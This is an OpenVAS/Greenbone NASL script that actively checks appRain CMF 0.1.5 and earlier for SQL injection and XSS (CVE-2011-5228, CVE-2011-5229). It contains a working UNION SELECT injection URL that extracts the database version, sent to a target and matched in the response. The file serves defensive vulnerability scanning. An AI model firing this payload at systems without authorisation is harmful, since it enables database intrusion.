# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902690");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-10-29 16:47:00 +0530 (Mon, 29 Oct 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-5228", "CVE-2011-5229");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("appRain CMF <= 0.1.5 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"appRain CMF is prone to SQL injection (SQLi) and cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to an input passed via

  - 'PATH_INFO' to quickstart/profile/index.php in the Forum module is not properly sanitized
  before being used in a SQL query.

  - 'ss' parameter in 'search' action is not properly verified before it is returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to execute
  arbitrary web script or HTML in a user's browser session in the context of an affected site and
  manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"appRain CMF version 0.1.5 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71880");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51105");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71881");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18249/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/appRain", "/apprain", "/", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/profile/index.php";

  res = http_get_cache(port: port, item: url);
  if (res !~ "^HTTP/1\.[01] 200" || "Start with appRain<" >!< res)
    continue;

  url = dir + "/profile/-1%20union%20all%20select%201,2,3,CONCAT" +
              "(0x6f762d73716c2d696e6a2d74657374,0x3a,@@version,0x3a,0x6f762d7"+
              "3716c2d696e6a2d74657374),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--";

  if (http_vuln_check(port: port, url: url, pattern: "ov-sql-inj-test:[0-9]+.*:ov-sql-inj-test",
                      check_header: TRUE, extra_check: make_list('>Profile','Start with appRain<'))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
